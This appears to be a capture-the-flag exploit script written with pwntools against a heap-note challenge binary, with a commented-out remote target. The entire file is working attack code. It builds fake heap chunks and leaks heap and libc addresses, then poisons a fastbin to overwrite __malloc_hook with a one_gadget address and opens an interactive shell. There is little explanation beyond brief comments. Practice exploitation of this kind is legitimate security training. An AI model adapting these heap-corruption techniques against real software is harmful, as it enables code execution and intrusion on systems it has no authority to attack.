from pwn import *

io = process("./chall",env={"LD_PRELOAD":"./libc.so.6"})

#io=remote('172.35.29.41',9999)


def add(size,note):
    io.sendlineafter("Choice >>","1")
    io.sendlineafter("Size:",str(size))
    io.sendafter("Note:",str(note))

def delete(idx):
    io.sendlineafter("Choice >>","2")
    io.sendlineafter("Index:",str(idx))


io.send("1\n"+"70\n"+"a"*70+"\n")
io.send("1\n"+"70\n"+"a"*70+"\n")

payload = "\x00"*48+p64(0)+p64(0x21)          # this will be the place where fake chunk is created

add(70,payload)
io.send("1\n"+"70\n"+"a"*70+"\n")



io.send("1\n"+"70\n"+"a"*70+"\n1\n"+"70\n"+"a"*70+"\n1\n"+"70\n"+"a"*70+"\n1\n"+"70\n"+"a"*70+"\n1\n"+"70\n"+"a"*70+"\n1\n"+"70\n"+"a"*70+"\n1\n"+"70\n"+"a"*70+"\n2\n"+"0\n2\n"+"1\n2\n"+"0\n")
delete(2)


add(10,"\xf0")        # change the header's first address to a place with heap address
io.send("2\n"+"0\n")
io.recvuntil("You will free: ")

heap_leak = u64(io.recv(6)+"\x00\x00")-0x10
log.info("heap @ "+str(hex(heap_leak)))

io.send("2\n"+"3\n")
add(10,p64(heap_leak+0x140))  # point to fake chunk
add(70,"e"*10)

payload = "\x00"*8+p64(0xe1)      # edit the fake chunk thus overwriting a headers chunk's size
add(16,payload)

io.send("2\n"+"3\n")



io.send("2\n"+"4\n2\n"+"5\n2\n"+"4\n2\n"+"6\n")


add(10,p64(heap_leak+0x160))  # change the header's first address to a place with libc address

io.send("2\n"+"4\n")
io.recvuntil("You will free: ")

libc_leak = u64(io.recv(6)+"\x00\x00")-0x3c4b78

log.info("libc @ "+str(hex(libc_leak)))

payload = p64(0)*13+p64(0x71)
add(150,payload)


io.send("2\n"+"4\n2\n"+"3\n")

hook = libc_leak + 0x3c4aed

payload = p64(0)*13+p64(0x71)+p64(hook)
add(150,payload)

io.send("2\n"+"8\n2\n"+"9\n")
#delete(10)

add(96,"00000")

one = libc_leak + 0xf02a4

payload = "\x00"*19 + p64(one)
add(96,payload)


io.send("2\n"+"9\n")
#gdb.attach(io)
io.send("2\n"+"9\n")

io.interactive()
